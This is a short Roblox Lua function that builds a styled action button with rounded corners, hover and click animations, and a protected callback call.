local function createActionButton(parent, y, icon, text, color, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.95, 0, 0, 40)
    btn.Position = UDim2.new(0, 0, 0, y)
    btn.BackgroundColor3 = color or Colors.DarkerBg
    btn.BackgroundTransparency = 0.3
    btn.Text = icon .. "  " .. text
    btn.TextColor3 = Colors.White
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 11
    btn.BorderSizePixel = 0
    btn.Parent = parent
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 10)
    btnCorner.Parent = btn
    
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {BackgroundColor3 = Colors.RedDark, Size = UDim2.new(0.96, 0, 0, 42)}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {BackgroundColor3 = color or Colors.DarkerBg, Size = UDim2.new(0.95, 0, 0, 40)}):Play()
    end)
    
    btn.MouseButton1Click:Connect(function()
        pcall(callback)
        TweenService:Create(btn, TweenInfo.new(0.06, Enum.EasingStyle.Quad), {Size = UDim2.new(0.93, 0, 0, 38)}):Play()
        task.wait(0.06)
        TweenService:Create(btn, TweenInfo.new(0.06, Enum.EasingStyle.Quad), {Size = UDim2.new(0.95, 0, 0, 40)}):Play()
    end)
    
    return btn
end

